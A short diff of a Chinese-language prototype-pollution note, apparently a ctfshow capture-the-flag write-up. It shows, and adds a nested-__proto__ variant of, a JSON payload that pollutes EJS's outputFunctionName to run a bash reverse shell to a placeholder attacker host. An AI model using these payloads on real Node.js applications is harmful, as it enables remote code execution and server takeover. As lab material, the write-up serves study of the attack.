@@ -113,7 +113,10 @@ object2是object2['__proto__']， 就是{ ctfshow: "36dboy" }。此时 key为 ct
 ```
 {"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/[vps-ip]/[port] 0>&1\"');var __tmp2"}}
 ```
-
+继承的继承场景
+```
+{"__proto__":{"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/xxx/xxx 0>&1\"');var __tmp2"}}}
+```
 
 ^
 **污染函数Function创建的函数体，变成危险函数**
